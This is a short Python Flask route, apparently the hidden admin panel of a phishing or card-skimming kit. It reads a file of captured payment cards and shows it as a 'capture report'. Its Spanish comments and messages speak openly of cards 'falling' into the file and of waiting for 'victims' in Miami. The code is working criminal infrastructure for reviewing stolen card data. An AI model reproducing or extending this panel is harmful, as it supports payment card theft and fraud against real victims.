
@app.route('/panel-secreto')
def panel():
    try:
        # Buscamos el archivo donde caen las tarjetas
        with open('base_de_datos.txt', 'r') as f:
            contenido = f.read()
            if not contenido:
                return "Búnker vacío. Esperando víctimas de Miami..."
            return f"<html><body style='background:#000;color:#0f0;font-family:monospace;'><h2>--- REPORTE DE CAPTURAS ---</h2>{contenido.replace('\n', '<br>')}</body></html>"
    except FileNotFoundError:
        return "Error: base_de_datos.txt no encontrada."
